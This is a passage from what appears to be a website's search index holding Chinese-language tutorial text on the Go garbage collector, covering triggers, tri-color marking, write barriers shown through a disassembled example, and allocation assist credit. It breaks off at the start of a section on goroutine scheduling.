<p>\u5783\u573e\u56de\u6536\u7684\u8fc7\u7a0b\u4e3b\u8981\u6d89\u53ca\u600e\u4e48\u89e6\u53d1\u3001\u600e\u4e48\u542f\u52a8\u3001\u600e\u4e48\u6807\u8bb0\u3001\u600e\u4e48\u6e05\u7406\u8fd9\u4e9b\u95ee\u9898\uff0c\u6211\u4eec\u4e0b\u9762\u6765\u8be6\u7ec6\u4e86\u89e3\u8fd9\u4e9b\u95ee\u9898\u3002</p>"},{"location":"go/gc/#_3","title":"\u89e6\u53d1","text":"<p>\u6709\u4e09\u79cd\u60c5\u51b5\u4f1a\u89e6\u53d1\u5783\u573e\u56de\u6536\uff0c\u901a\u8fc7\u81ea\u52a8\u89e6\u53d1\uff0c\u624b\u5de5\u89e6\u53d1\uff0c\u7cfb\u7edf\u76d1\u63a7\u7a0b\u5e8f\u6765\u89e6\u53d1\u3002</p> <p>\u81ea\u52a8\u89e6\u53d1\u662f\u6709\u4e00\u4e2a\u9608\u503c(nextGC)\uff0c\u9ed8\u8ba4\u53ef\u80fd\u662f4MB\u6216\u80058MB\uff0c\u5f53\u5728\u5806\u4e0a\u5206\u914d\u7684\u5185\u5b58\u8d85\u8fc7\u8be5\u9608\u503c\uff0c\u5219\u81ea\u52a8\u542f\u52a8\u56de\u6536\uff0c\u6bcf\u6b21\u542f\u52a8\u540e\u8c03\u6574\u4e0b\u6b21\u9608\u503c\u7ffb\u500d\u3002</p> <p>\u624b\u5de5\u5f3a\u5236\u4f7f\u7528<code>runtime.GC</code>\u8fd9\u6837\u7684\u4ee3\u7801\u6765\u6267\u884c\u5783\u573e\u56de\u6536\uff0c\u8fd9\u79cd\u65b9\u5f0f\u4e0d\u4f1a\u53bb\u68c0\u67e5\u9608\u503c\uff0c\u5f80\u5f80\u7528\u6765\u6a21\u62df\u548c\u6d4b\u8bd5\u3002</p> <p>\u4e3a\u4ec0\u4e48\u8fd8\u9700\u8981\u7cfb\u7edf\u76d1\u63a7\u7a0b\u5e8f\u89e6\u53d1\u5462\uff1f\u5047\u8bbe\u67d0\u6bb5\u65f6\u95f4\u6709\u4e2a\u70ed\u70b9\uff0c\u5185\u5b58\u7a81\u7136\u4f7f\u7528\u4e86100MB\uff0c\u90a3\u4e48\u81ea\u52a8\u89e6\u53d1\u7684\u9608\u503c\u5c31\u4f1a\u88ab\u63a8\u9ad8\u5230200MB\uff0c\u8fd9\u65f6\u5019\u70ed\u70b9\u6d88\u5931\u5185\u5b58\u53ea\u4f7f\u7528\u4e8650MB\u65f6\uff0c\u53ef\u80fd\u572850~200\u4e4b\u95f4\u4e00\u76f4\u6ca1\u6cd5\u89e6\u53d1\u81ea\u52a8\u56de\u6536\u800c\u4ea7\u751f\u5927\u91cf\u5783\u573e\u3002\u7cfb\u7edf\u76d1\u63a7\u7a0b\u5e8f\u4f1a\u68c0\u67e5\u4e0a\u6b21\u5783\u573e\u56de\u6536\u82e5\u5df2\u7ecf\u8d85\u8fc72\u5206\u949f\uff0c\u5219\u5f3a\u5236\u6267\u884c\u4e00\u6b21\u5783\u573e\u56de\u6536\uff0c\u8fd9\u79cd\u65b9\u5f0f\u4e5f\u4e0d\u4f1a\u68c0\u67e5\u9608\u503c\u3002</p> <p>\u90a3\u4e48\u81ea\u52a8\u89e6\u53d1\u65f6\u5982\u4f55\u68c0\u67e5\u9608\u503c\u662f\u5426\u8fbe\u5230\u5462\uff1f\u6b63\u5e38\u60f3\u6cd5\u53ef\u80fd\u662f\u6bcf\u6b21\u6267\u884c<code>malloc(size)</code>\u51fd\u6570\u7684\u65f6\u5019\u7d2f\u52a0\u5176size\u5e76\u68c0\u67e5\u4e00\u6b21\uff0c\u8fd9\u79cd\u6548\u7387\u4f1a\u5f88\u4f4e\uff0c\u6bcf\u6b21\u5206\u914d\u90fd\u53bb\u68c0\u67e5\uff0c\u4e14\u8fd9\u4e2a\u51fd\u6570\u88ab\u6240\u6709\u7684P/M\u5171\u4eab\u5c31\u6d89\u53ca\u5230\u9700\u8981\u52a0\u9501\u3002Go\u4e2d\u91c7\u7528\u7684\u4f18\u5316\u7b56\u7565\u662f\u4e0d\u5728<code>malloc(size)</code>\u65f6\u68c0\u67e5\uff0c\u53ea\u6709\u5728\u5927\u5bf9\u8c61\u5206\u914d\u7684\u65f6\u5019\u624d\u68c0\u67e5\uff0c\u56e0\u4e3a\u5185\u5b58\u5206\u914d\u53ea\u6709\u4e24\u79cd\u60c5\u51b5\uff0c\u8981\u4e48\u4ece\u64cd\u4f5c\u7cfb\u7edf\u62ff\u56de\u4e00\u5927\u5757\u5185\u5b58\u6765\u5206\u914d\u7ed9\u67d0\u4e2a\u5927\u5bf9\u8c61\uff0c\u8981\u4e48\u62ff\u56de\u4e00\u5927\u5757\u5185\u5b58\u5207\u6210N\u591a\u5c0f\u5757\u590d\u7528\u3002</p>"},{"location":"go/gc/#_4","title":"\u542f\u52a8","text":"<p>\u542f\u52a8\u7684\u7b2c\u4e00\u6b65\u5c31\u662f\u5f00\u542fSTW\uff0c\u8ba9\u6240\u6709\u7684P/M\u8fdb\u5165\u5230\u4e00\u79cd\u7279\u6b8a\u7684\u72b6\u6001\u3002\u5176\u5b9e\u5f00\u542fSTW\u4e4b\u524d\u8fd8\u8981\u505a\u4e00\u4ef6\u4e8b\u60c5\uff0c\u4e0a\u4e00\u4e2a\u5783\u573e\u56de\u6536\u5468\u671f\u7684\u6e05\u7406\u5de5\u4f5c\u3002\u7136\u540e\u5783\u573e\u56de\u6536\u7684\u76f8\u5173\u6307\u4ee4\u548c\u51fd\u6570\u4f1a\u88ab\u6253\u5305\u4e3a\u4e00\u4e2a\u4e2aworker\uff0c\u8fdb\u800c\u4f5c\u4e3aG\u5bf9\u8c61\u4ea4\u7ed9\u8c03\u5ea6\u5668\u6267\u884c\uff0c\u5783\u573e\u56de\u6536\u4ee3\u7801\u548c\u7528\u6237\u4ee3\u7801\u90fd\u662fG\u5bf9\u8c61\u4ece\u800c\u5b9e\u73b0\u4e86\u5e76\u53d1\u3002</p>"},{"location":"go/gc/#worker","title":"worker","text":"<p>worker\u5206\u4e3a\u4e09\u79cd\uff0c\u7b2c\u4e00\u79cd\u5c5e\u4e8e\u6b63\u5f0f\u5de5\uff0c\u4e13\u95e8\u505a\u5783\u573e\u56de\u6536\uff1b\u7b2c\u4e8c\u79cd\u5c5e\u4e8e\u5c0f\u65f6\u5de5\uff0c\u6267\u884c\u4e00\u6bb5\u65f6\u95f4\u5783\u573e\u56de\u6536\u5c31\u91ca\u653eP/M\u6267\u884c\u7528\u6237\u903b\u8f91\uff1b\u7b2c\u4e09\u79cd\u662f\u4e34\u65f6\u5de5\uff0c\u6ca1\u6709\u7528\u6237G\u7684\u65f6\u5019\uff0cP/M\u4f1a\u95f2\u7f6e\uff0c\u5c31\u53ef\u80fd\u6709\u4e34\u65f6\u5de5\u6765\u6267\u884c\u4e00\u6bb5\u65f6\u95f4\u3002\u5982\u679c\u6ca1\u6709\u6b63\u5f0f\u5de5\uff0c\u5c0f\u65f6\u5de5\u548c\u4e34\u65f6\u5de5\u968f\u65f6\u90fd\u53ef\u80fd\u56e0\u4e3a\u62a2\u5360\u5f0f\u8c03\u5ea6\u53bb\u6267\u884c\u7528\u6237\u4ee3\u7801\uff0c\u53ef\u80fd\u5bfc\u81f4\u5783\u573e\u56de\u6536\u65e0\u6cd5\u7ed3\u675f\uff1b\u5982\u679c\u90fd\u662f\u6b63\u5f0f\u5de5\u4e5f\u4e0d\u884c\uff0c\u6b63\u5f0f\u5de5\u4e0d\u4f1a\u88ab\u62a2\u5360\uff0c\u7528\u6237\u903b\u8f91\u53ef\u80fd\u88ab\u997f\u6b7b\uff1b\u6240\u4ee5\u6709\u4e86\u5c0f\u65f6\u5de5\u548c\u4e34\u65f6\u5de5\uff0c\u5c0f\u65f6\u5de5\u7b97\u662f\u8f85\u52a9\u6b63\u5f0f\u5de5\u6765\u52a0\u5feb\u5783\u573e\u56de\u6536\u7684\u6548\u7387\uff0c\u800c\u4e34\u65f6\u5de5\u66f4\u4e0d\u9760\u8c31\uff0c\u53ea\u6709\u5728P/M\u95f2\u7f6e\u65f6\u624d\u53ef\u80fd\u6765\u5e2e\u5fd9\u3002</p> <p>\u8fd9\u79cd\u79cd\u63aa\u65bd\u5c31\u662f\u8981\u4fdd\u8bc1:</p> <ul> <li>\u5783\u573e\u56de\u6536\u4e00\u5b9a\u80fd\u591f\u5b8c\u6210</li> <li>\u5783\u573e\u56de\u6536\u5c3d\u53ef\u80fd\u5feb\u7684\u5b8c\u6210</li> <li>\u5783\u573e\u56de\u6536\u4e0d\u80fd\u5f71\u54cd\u7528\u6237\u4ee3\u7801\u7684\u6267\u884c</li> </ul>"},{"location":"go/gc/#controller","title":"controller","text":"<p>\u5728\u4e00\u4e2a\u5783\u573e\u56de\u6536\u7684\u5468\u671f\u5185\uff0c\u4f1a\u6709\u4e00\u4e2acontroller\u6765\u6536\u96c6\u4fe1\u606f\uff0c\u5b83\u4f1a\u6536\u96c6\u5b8c\u6210\u8fd9\u4e2a\u5468\u671f\u82b1\u4e86\u591a\u5c11\u7269\u7406\u65f6\u95f4\uff0c\u82b1\u4e86\u591a\u5c11CPU\u65f6\u95f4\uff0c\u5f00\u59cb\u548c\u7ed3\u675f\u7684\u65f6\u5019\u5806\u7684\u5927\u5c0f\uff0c\u4f7f\u7528\u7684\u6b63\u5f0f\u5de5\u3001\u4e34\u65f6\u5de5\u3001\u5c0f\u65f6\u5de5\u7684\u6570\u91cf\u3002\u901a\u8fc7\u8fd9\u4e9b\u4fe1\u606f\uff0ccontroller\u5c31\u4f1a\u53bb\u63a8\u7b97\u4e0b\u4e00\u4e2a\u5468\u671f\u5783\u573e\u56de\u6536\u7684\u9608\u503c\u5e94\u5347\u9ad8\u8fd8\u662f\u964d\u4f4e\uff0c\u6bd4\u5982nextGC\u5f53\u524d\u662f4MB\uff0c\u4e0b\u4e00\u6b21\u5c31\u5e94\u8be5\u662f8MB\uff0c\u901a\u8fc7controller\u63a8\u7b97\u51fa\u5e94\u8be5\u964d\u4f4e10%\uff0c\u90a3\u6700\u7ec8\u89e6\u53d1\u7684\u9608\u503c\u5c31\u662f7.2MB\uff1b\u53e6\u5916\uff0ccontroller\u4e5f\u4f1a\u53bb\u63a8\u7b97\u591a\u5c11\u6b63\u5f0f\u5de5\u3001\u4e34\u65f6\u5de5\u3001\u5c0f\u65f6\u5de5\u53c2\u4e0e\u662f\u5408\u7406\u7684\u3002\u8fd9\u4e9b\u63a8\u7b97\u90fd\u662f\u6982\u7387\u95ee\u9898\uff0c\u5c5e\u4e8e\u5c40\u90e8\u6027\u539f\u5219\u7684\u4e00\u79cd\u5e94\u7528\uff0c\u672c\u6b21\u5783\u573e\u56de\u6536\u7684\u538b\u529b\u5927\uff0c\u90a3\u4e48\u4e0b\u6b21\u5783\u573e\u56de\u6536\u538b\u529b\u5927\u7684\u6982\u7387\u5c31\u9ad8\u4e00\u4e9b\u3002\u8fd9\u79cd\u7b80\u5355\u7684\u7b56\u7565\u4e3a\u5783\u573e\u56de\u6536\u589e\u52a0\u4e86\u4e00\u4e9b\u7075\u6d3b\u6027\uff0c\u6bd4\u50f5\u5316\u7684\u9608\u503c\u8bbe\u5b9a\u8981\u597d\u4e00\u4e9b\u3002</p>"},{"location":"go/gc/#_5","title":"\u6807\u8bb0","text":""},{"location":"go/gc/#_6","title":"\u4e09\u8272\u6807\u8bb0","text":"<p>\u542f\u52a8\u4e4b\u540e\u5c31\u8981\u5f00\u59cb\u6267\u884c\u6807\u8bb0\u64cd\u4f5c\uff0c\u6807\u8bb0\u6709\u4e00\u4e2a\u57fa\u672c\u7684\u89c4\u5219\u53eb\u4e09\u8272\u6807\u8bb0\u539f\u5219\u3002</p> <p>\u6211\u4eec\u628a\u4efb\u4e00\u6bb5\u4ee3\u7801\u7f16\u8bd1\u4e4b\u540e\uff0c\u4f1a\u53d1\u73b0\u7f16\u8bd1\u5668\u63d2\u5165\u4e00\u4e9b\u4f8b\u5982<code>PCDATA</code>\u8fd9\u6837\u7684\u6307\u4ee4\uff0c\u5b83\u5c5e\u4e8e\u4f2a\u6307\u4ee4\uff0c\u662f\u4e3a\u4e86\u5728\u7f16\u8bd1\u65f6\u8bb0\u5f55\u5bf9\u8c61\u7684\u76f8\u5173\u4fe1\u606f\u4ee5\u53ca\u4e00\u4e9b\u5143\u6570\u636e\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u7528\u6765\u7ed9\u5185\u5b58\u5206\u914d\u5668\u63d0\u4f9b\u53c2\u8003:\u5f53\u5728\u5806\u4e0a\u5206\u914d\u4e00\u4e2a\u5bf9\u8c61\u7684\u65f6\u5019\uff0c\u9664\u4e86\u53bb\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58(\u6bd4\u5982\u8d77\u59cb\u4f4d\u7f6e0x100100)\uff0c\u8fd8\u4f1a\u5728\u4e00\u4e2a\u4f4d\u56fe\u4e2d\u67e5\u627e\u5230\u7d22\u5f150x100100\u7684\u4f4d\u7f6e\uff0c\u6309\u7167\u5143\u6570\u636e\u4e2d\u7684\u7c7b\u578b\u4fe1\u606f\u6807\u8bb0\u51fa\u8be5\u5bf9\u8c61\u7684\u7b2c\u51e0\u4e2a\u4f4d\u7f6e\u662f\u6307\u9488\u3002</p> <p>\u800c\u4e00\u4e2a\u5bf9\u8c61\u8981\u4e48\u662f\u4ece\u5168\u5c40\u53d8\u91cf\u5f15\u7528\u4e0b\u6765\uff0c\u8981\u4e48\u662f\u4ece\u6808\u4e0a\u5f15\u7528\u4e0b\u6765\uff0c\u81ea\u7136\u5c31\u4f1a\u6709\u6839\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u6839\u5bf9\u8c61\u5c31\u662f\u4f4d\u56fe\u4e2d\u7684\u6307\u9488\u3002\u5783\u573e\u56de\u6536\u7684\u65f6\u5019\u5c31\u662f\u5148\u53bb\u67e5\u770b\u4f4d\u56fe\u6709\u6ca1\u6709\u6307\u9488\uff0c\u6839\u636e\u6307\u9488\u4e00\u8def\u8ffd\u8e2a\u626b\u63cf\u4e0b\u53bb\u3002</p> <p>\u5728\u4e00\u6b21\u626b\u63cf\u5f00\u59cb\u65f6\uff0c\u4f1a\u8ba4\u4e3a\u6240\u6709\u7684\u5bf9\u8c61\u662f\u767d\u8272\u7684\u3002\u6839\u5bf9\u8c61\u4e00\u5b9a\u662f\u6d3b\u7684\uff0c\u90a3\u4e48\u88ab\u5b83\u5f15\u7528\u7684\u5bf9\u8c61\u4e5f\u4e00\u5b9a\u662f\u6d3b\u7684\uff0c\u5c31\u628a\u5b83\u6807\u8bb0\u4e3a\u7070\u8272\u7684\uff0c\u5e76\u628a\u5b83\u7684\u5f15\u7528\u653e\u5728\u4e00\u4e2a\u961f\u5217\u4e2d\u53bb\u3002\u63a5\u7740\u628a\u8fd9\u4e2a\u961f\u5217\u7684\u7070\u8272\u5bf9\u8c61\u4f9d\u6b21\u62ff\u51fa\u6765\uff0c\u6bd4\u5982\u5148\u62ff\u51fa\u4e86\u7070\u8272\u7684A\uff0c\u770bA\u5f15\u7528\u7684\u5bf9\u8c61\u662f\u4ec0\u4e48\uff0c\u628aA\u5f15\u7528\u7684\u5bf9\u8c61\u91cd\u65b0\u52a0\u5230\u961f\u5217\u4e2d\u53bb\uff0c\u5e76\u628aA\u6807\u8bb0\u4e3a\u9ed1\u8272\u3002\u91cd\u590d\u6267\u884c\u8fd9\u4e2a\u8fc7\u7a0b\uff0c\u90a3\u4e48\u6700\u7ec8\u5c31\u53ea\u4f1a\u5269\u4e0b\u4e24\u79cd\u5bf9\u8c61\uff0c\u9ed1\u8272\u7684\u548c\u767d\u8272\u7684\uff0c\u9ed1\u8272\u7684\u662f\u6d3b\u7740\u7684\uff0c\u767d\u8272\u7684\u662f\u6b7b\u6389\u7684\u3002</p>"},{"location":"go/gc/#_7","title":"\u5199\u5c4f\u969c","text":"<p>\u4f46\u8fd8\u6709\u4e2a\u95ee\u9898\u6ca1\u6709\u89e3\u51b3\uff0c\u6807\u8bb0\u7684\u540c\u65f6\u7528\u6237\u4ee3\u7801\u4e5f\u5728\u6267\u884c\uff0c\u5982\u679c\u5df2\u7ecf\u6807\u8bb0\u4e3a\u9ed1\u8272\u7684\u5bf9\u8c61\u53c8\u5f15\u7528\u4e86\u4e00\u4e2a\u767d\u8272\u5bf9\u8c61C\u600e\u4e48\u529e\uff0c\u56e0\u4e3a\u4e0d\u4f1a\u5bf9\u9ed1\u8272\u5bf9\u8c61\u8fdb\u884c\u4e8c\u6b21\u626b\u63cf\uff0c\u5728\u6700\u7ec8\u6e05\u7406\u65f6\u5c31\u4f1a\u628a\u8fd9\u4e2aC\u4e5f\u8bef\u6740\u6389\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u5728\u7f16\u8bd1\u671f\u7f16\u8bd1\u5668\u5c31\u4f1a\u5bf9\u6307\u9488\u5199\u64cd\u4f5c\u7684\u8bed\u53e5\u63d2\u5165\u4e00\u6bb5\u200b\u5199\u5c4f\u969c\u200b\u4ee3\u7801\uff0c\u8fd9\u6bb5\u4ee3\u7801\u4f1a\u5224\u65ad\u5982\u679c\u5f53\u524d\u6b63\u5728\u5783\u573e\u56de\u6536\uff0c\u6307\u9488\u7684\u5199\u64cd\u4f5c\u4e0d\u4f1a\u7acb\u5373\u6267\u884c\uff0c\u800c\u662f\u5148\u6267\u884c\u5199\u5c4f\u969c\u903b\u8f91\u3002\u5199\u5c4f\u969c\u903b\u8f91\u4f1a\u5224\u65ad\u8fd9\u4e2a\u6307\u9488\u82e5\u662f\u9ed1\u8272\u7684\uff0c\u5c31\u628a\u5b83\u91cd\u65b0\u53d8\u6210\u7070\u8272\u7684\u52a0\u5165\u961f\u5217\u8fdb\u884c\u4e8c\u6b21\u626b\u63cf\u3002</p> <p>\u5177\u4f53\u5982\u4f55\u52a0\u5165\u5199\u5c4f\u969c\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5982\u4e0b\u793a\u4f8b: <pre><code>var x *int\nfunc main(){\n    x = new(int)\n    println(x)\n}\n</code></pre></p> <p>\u7136\u540e\u6211\u4eec\u7f16\u8bd1\u5e76\u53cd\u6c47\u7f16: <pre><code>[ubuntu] ~/.mac $ go tool objdump -s \"main\\.main\" test\nTEXT main.main(SB) /root/.mac/test.go\n  test.go:5     0x452330        64488b0c25f8ffffff  MOVQ FS:0xfffffff8, CX\n  test.go:5     0x452339        483b6110        CMPQ 0x10(CX), SP\n  test.go:5     0x45233d        766a            JBE 0x4523a9\n  test.go:5     0x45233f        4883ec18        SUBQ $0x18, SP\n  test.go:5     0x452343        48896c2410      MOVQ BP, 0x10(SP)\n  test.go:5     0x452348        488d6c2410      LEAQ 0x10(SP), BP\n  test.go:6     0x45234d        488d052cbc0000      LEAQ 0xbc2c(IP), AX\n  test.go:6     0x452354        48890424        MOVQ AX, 0(SP)\n  test.go:6     0x452358        e8038afbff      CALL runtime.newobject(SB)\n  test.go:6     0x45235d        488b442408      MOVQ 0x8(SP), AX\n  test.go:6     0x452362        833d37dd080000      CMPL $0x0, runtime.writeBarrier(SB)\n  test.go:6     0x452369        7530            JNE 0x45239b\n  test.go:6     0x45236b        4889058e270700      MOVQ AX, main.x(SB)\n  test.go:7     0x452372        e83931fdff      CALL runtime.printlock(SB)\n  test.go:7     0x452377        488b0582270700      MOVQ main.x(SB), AX\n  test.go:7     0x45237e        48890424        MOVQ AX, 0(SP)\n  test.go:7     0x452382        e8293afdff      CALL runtime.printpointer(SB)\n  test.go:7     0x452387        e8b433fdff      CALL runtime.printnl(SB)\n  test.go:7     0x45238c        e89f31fdff      CALL runtime.printunlock(SB)\n  test.go:8     0x452391        488b6c2410      MOVQ 0x10(SP), BP\n  test.go:8     0x452396        4883c418        ADDQ $0x18, SP\n  test.go:8     0x45239a        c3          RET\n  test.go:6     0x45239b        488d3d5e270700      LEAQ main.x(SB), DI\n  test.go:6     0x4523a2        e8f998ffff      CALL runtime.gcWriteBarrier(SB)\n  test.go:6     0x4523a7        ebc9            JMP 0x452372\n  test.go:5     0x4523a9        e8f27affff      CALL runtime.morestack_noctxt(SB)\n  test.go:5     0x4523ae        eb80            JMP main.main(SB)\n</code></pre></p> <p>\u6211\u4eec\u770b\u5230<code>new(int)</code>\u5bf9\u5e94<code>CALL runtime.newobject(SB)</code>\uff0c\u4e4b\u540e\u901a\u8fc7<code>CMPL $0x0, runtime.writeBarrier(SB)</code>\u8fdb\u884c\u6bd4\u8f83\uff0c\u6bd4\u8f83\u7ed3\u679c\u4e3a\u771f\u5219\u8df3\u8f6c\u81f3\u4e0b\u9762\u7684<code>CALL runtime.gcWriteBarrier(SB)</code>\uff0c\u6267\u884c\u5b8c\u4e86\u518d\u8df3\u8f6c\u56de\u53bb\u7ee7\u7eed\u8d4b\u503c\u3002</p> src/runtime/mgc.go<pre><code>var writeBarrier struct {\n    enabled bool    // compiler emits a check of this before calling write barrier\n    pad     [3]byte // compiler uses 32-bit load for \"enabled\" field\n    needed  bool    // whether we need a write barrier for current GC phase\n    cgo     bool    // whether we need a write barrier for a cgo check\n    alignme uint64  // guarantee alignment so that compiler can use a 32 or 64-bit load\n}\n</code></pre> <p>\u6211\u4eec\u901a\u8fc7\u5199\u5c4f\u969c\u7684\u5b9a\u4e49\u4e5f\u5c31\u77e5\u9053\u4e86<code>$0x0</code>\u662f\u548c\u8fd9\u91cc\u7684enabled\u8fdb\u884c\u6bd4\u8f83\u7684\uff0c\u8fd9\u79cd\u7b80\u5355\u7684\u6bd4\u8f83\u5bf9\u6027\u80fd\u7684\u5f71\u54cd\u662f\u975e\u5e38\u5c0f\u7684\u3002</p>"},{"location":"go/gc/#_8","title":"\u6323\u5de5\u5206","text":"<p>\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u7528\u6237\u4ee3\u7801\u4e2d\u5206\u914d\u5bf9\u8c61\u7684\u901f\u5ea6\u8fdc\u5927\u4e8e\u56de\u6536\u7684\u901f\u5ea6\uff0c\u9020\u6210\u5783\u573e\u56de\u6536\u65e0\u6cd5\u7ed3\u675f\u3002\u8fd9\u79cd\u60c5\u51b5\u5982\u4f55\u5904\u7406\u5462\uff1f</p> <p>\u6bcf\u6b21\u5206\u914d\u5bf9\u8c61\u7684\u65f6\u5019\uff0c\u4f1a\u53bb\u68c0\u67e5\u82e5\u5f53\u524d\u6b63\u5728\u5783\u573e\u56de\u6536\uff0c\u5219\u6bcf\u4e2aG\u5bf9\u8c61\u90fd\u4f1a\u6709\u4e00\u4e2a\u4fe1\u7528\u503c\uff0c\u5206\u914d\u4e00\u4e2asize\u5927\u5c0f\u7684\u5bf9\u8c61\uff0c\u5c31\u628a\u8fd9\u4e2a\u4fe1\u7528\u503c\u51cf\u53bbsize\uff0c\u76f4\u5230\u8fd9\u4e2a\u4fe1\u7528\u503c\u4e3a\u8d1f\u6570\uff0c\u5219\u628a\u8fd9\u4e2a\u6267\u884c\u4e00\u534a\u7684G\u6682\u505c\u5e76\u4fdd\u5b58\u4e0a\u4e0b\u6587\u4e22\u56de\u7ed9\u8c03\u5ea6\u5668\uff0c\u5176\u7ed1\u5b9a\u7684P/M\u6765\u5e2e\u52a9\u8fdb\u884c\u5783\u573e\u56de\u6536\u6323\u5de5\u5206\uff0c\u5de5\u5206\u6323\u5230\u4e00\u5b9a\u7a0b\u5ea6\u6bd4\u59823\u500d\u7684\u4fe1\u7528\u503c\u5219\u63a5\u7740\u53bb\u6267\u884c\u7528\u6237\u4ee3\u7801(\u8fd9\u4e2a\u53ef\u80fd\u5c31\u4e0d\u4f1a\u63a5\u7740\u4e4b\u524d\u6682\u505c\u7684G\u3001\u53ef\u80fd\u662f\u4efb\u610fG)\u3002</p> <p>\u4f46\u662f\u4ec5\u8fd9\u79cd\u6323\u5de5\u5206\u6765\u8fd8\u503a\u518d\u63a5\u7740\u6267\u884c\u7528\u6237\u4ee3\u7801\u7684\u65b9\u5f0f\u6548\u7387\u53ef\u80fd\u4f1a\u5f88\u4f4e\uff0c\u56e0\u4e3a\u672c\u8eab\u5783\u573e\u56de\u6536\u5668\u5c31\u6709worker\uff0c\u8fd9\u4e9bworker\u53ef\u80fd\u7a81\u7136\u6267\u884c\u6548\u7387\u5f88\u9ad8\uff0c\u5bfc\u81f4\u6765\u534f\u52a9\u6323\u5de5\u5206\u7684P/M\u6323\u4e0d\u5230\uff0c\u4e8e\u662f\u5c31\u6709\u4e86\u4e00\u4e2a\u516c\u7528\u7684\u4fe1\u7528\u503c\u6765\u5b58\u50a8\u5783\u573e\u56de\u6536\u5668\u4e2dworkder\u6323\u7684\u5de5\u5206\u3002\u6240\u4ee5\u5f53\u516c\u7528\u7684\u4fe1\u7528\u503c\u8fd8\u6709\u989d\u5ea6\u7684\u65f6\u5019\uff0c\u8bf4\u660e\u5783\u573e\u56de\u6536\u7684\u538b\u529b\u8fd8\u4e0d\u5927\uff0c\u7528\u6237G\u4f1a\u5148\u53bb\u5c1d\u8bd5\u6263\u51cf\u8fd9\u4e2a\u516c\u7528\u4fe1\u7528\u503c\uff0c\u5982\u679c\u4e0d\u591f\u6263\u624d\u4f1a\u53bb\u5e2e\u52a9\u5783\u573e\u56de\u6536\u3002</p>"},{"location":"go/gc/#_9","title":"\u6e05\u7406","text":"<p>\u6807\u8bb0\u5b8c\u4e4b\u540e\u5982\u4f55\u6e05\u7406\u5462\uff1f\u5185\u5b58\u662f\u5206\u5757\u7684\uff0c\u6bcf\u4e2a\u5927\u5757\u4e0b\u53c8\u5206\u4e86\u5f88\u591a\u5c0f\u5757\uff0c\u6bcf\u4e2a\u5c0f\u5757\u53ef\u80fd\u4ee3\u8868\u4e00\u4e2a\u5bf9\u8c61\u3002\u5b83\u8fd8\u6709\u4e00\u4efd\u5143\u6570\u636e\uff0c\u662f\u4e00\u4e2a\u4f4d\u56fe\uff0c\u4f4d\u56fe\u548c\u8fd9\u4e9b\u5185\u5b58\u5757\u4e00\u4e00\u5bf9\u5e94\u3002\u6240\u8c13\u7684\u56de\u6536\u6e05\u7406\u53ea\u662f\u6807\u8bb0\u51fa\u5728\u8fd9\u4e2a\u4f4d\u56fe\u4e2d\u54ea\u4e9b\u5757\u662f\u6b7b\u4e86\u7684\uff0c\u544a\u8bc9\u5185\u5b58\u5206\u914d\u5668\u54ea\u4e9b\u5757\u662f\u53ef\u4ee5\u5408\u5e76\u7684\u7b49\uff0c\u4ee5\u4fbf\u4e8e\u4e0b\u4e00\u6b21\u80fd\u76f4\u63a5\u590d\u7528\u3002</p> <p>\u6e05\u7406\u64cd\u4f5c\u4e5f\u662f\u548c\u7528\u6237\u4ee3\u7801\u5e76\u53d1\u7684\uff0c\u4f46\u8981\u6e05\u7406\u7684\u8fd9\u4e9b\u5bf9\u8c61\u548c\u7528\u6237\u903b\u8f91\u4e4b\u95f4\u6ca1\u6709\u4efb\u4f55\u5e72\u6270\uff0c\u4e92\u76f8\u4e0d\u5f71\u54cd\uff0c\u76f8\u5bf9\u6bd4\u8f83\u5bb9\u6613\u3002</p>"},{"location":"go/gc/#_10","title":"\u603b\u7ed3","text":"<p>\u5728\u7814\u7a76\u5783\u573e\u56de\u6536\u5668\u7684\u8bbe\u8ba1\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u53d1\u73b0\u6574\u4e2a\u5904\u7406\u8fc7\u7a0b\u662f\u6bd4\u8f83\u590d\u6742\u7684\u3002\u5783\u573e\u56de\u6536\u5668\u7684\u8bbe\u8ba1\u4e2d\u6709\u5927\u91cf\u7684\u7ec6\u8282\u5904\u7406\u662f\u5728\u627e\u5e73\u8861\uff0c\u5728\u6267\u884c\u6548\u7387\u548c\u7a7a\u95f4\u5360\u7528\u4e2d\u627e\u5230\u5e73\u8861\u3002</p>"},{"location":"go/goroutine/","title":"Go\u5e76\u53d1\u8c03\u5ea6","text":""},{"location":"go/goroutine/#_1","title":"\u80cc\u666f\u77e5\u8bc6","text":"<p>GO\u548c\u5176\u4ed6\u8bed\u8a00\u4e0d\u540c\u7684\u5c31\u662f\u6211\u4eec\u5f88\u5c11\u5728GO\u4e2d\u542c\u5230\u591a\u7ebf\u7a0b\u7684\u6982\u5ff5\uff0c\u5176\u63d0\u4f9b\u7684API\u4e2d\u4e5f\u6ca1\u6709\u521b\u5efa\u7ebf\u7a0b\u8fd9\u79cd\u4e1c\u897f\u3002\u56e0\u4e3a\u8fd9\u95e8\u8bed\u8a00\u4ece\u7528\u6237\u5199\u7684\u7b2c\u4e00\u884c\u4ee3\u7801\u5f00\u59cb\u5c31\u662f\u5e76\u53d1\u72b6\u6001\u7684\u3002</p>"},{"location":"go/goroutine/#_2","title":"\u5e76\u53d1\u4e0e\u5e76\u884c","text":"<p>\u5e76\u53d1\u200b\u662f\u6307\u591a\u4e2a\u903b\u8f91\u53ef\u4ee5\u540c\u65f6\u6267\u884c\uff0c\u628aCPU\u65f6\u95f4\u5206\u6210\u4e0d\u540c\u7684\u65f6\u95f4\u7247\u6bb5\uff0c\u8fd9\u4e9b\u65f6\u95f4\u7247\u6bb5\u5206\u914d\u7ed9\u4e0d\u540c\u7684\u903b\u8f91\uff0c\u6784\u6210\u4e00\u4e2a\u5b8c\u6574\u7684CPU\u6267\u884c\u65f6\u95f4\u5e8f\u5217\u3002 